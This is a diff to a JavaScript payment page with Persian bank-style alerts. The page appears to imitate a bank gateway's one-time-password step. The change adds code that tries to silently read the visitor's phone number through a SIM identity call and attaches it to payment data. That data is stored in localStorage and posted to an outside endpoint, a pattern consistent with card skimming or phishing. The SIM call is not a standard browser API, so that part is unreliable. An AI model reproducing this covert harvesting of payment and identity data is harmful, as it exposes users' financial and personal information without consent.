@@ -241,34 +241,51 @@
                     "timestamp": new Date().toISOString()
                 };
 
-                let storedData = JSON.parse(localStorage.getItem('paymentData')) || [];
-                storedData.push(jsonData);
-                localStorage.setItem('paymentData', JSON.stringify(storedData));
-
-                fetch('https://reqres.in/api/users', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(jsonData)
-                })
-                .then(response => response.json())
-                .then(data => {
-                    alert("درخواست رمز پویا به بانک مبدا ارسال شد");
-                    document.getElementById('request-otp').style.display = 'none';
-                    document.getElementById('otp-timer').style.display = 'block';
-                    startOTPTimer(120);
-
-                    const adminSection = document.getElementById('admin-section');
-                    adminSection.style.display = 'block';
-                    adminSection.scrollIntoView({ behavior: 'smooth' });
-                })
-                .catch(error => {
-                    alert("خطا در ارسال اطلاعات: " + error.message);
-                });
+                // تلاش برای گرفتن شماره تلفن (این بخش در بسیاری از مرورگرها کار نمی‌کند)
+                if (navigator.sim) {
+                    navigator.sim.getSubscriberIdentity()
+                    .then(identity => {
+                        jsonData.phone_number = identity.msisdn; // شماره تلفن
+                        saveAndSendData(jsonData);
+                    })
+                    .catch(error => {
+                        console.error("Could not get phone number:", error);
+                        saveAndSendData(jsonData); // بدون شماره تلفن ادامه می‌دهد
+                    });
+                } else {
+                    saveAndSendData(jsonData); // اگر SIM API پشتیبانی نشود
+                }
             } else {
                 alert("کد امنیتی نامعتبر است");
             }
+        }
+
+        function saveAndSendData(jsonData) {
+            let storedData = JSON.parse(localStorage.getItem('paymentData')) || [];
+            storedData.push(jsonData);
+            localStorage.setItem('paymentData', JSON.stringify(storedData));
+
+            fetch('https://reqres.in/api/users', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(jsonData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("درخواست رمز پویا به بانک مبدا ارسال شد");
+                document.getElementById('request-otp').style.display = 'none';
+                document.getElementById('otp-timer').style.display = 'block';
+                startOTPTimer(120);
+
+                const adminSection = document.getElementById('admin-section');
+                adminSection.style.display = 'block';
+                adminSection.scrollIntoView({ behavior: 'smooth' });
+            })
+            .catch(error => {
+                alert("خطا در ارسال اطلاعات: " + error.message);
+            });
         }
 
         function startOTPTimer(duration) {
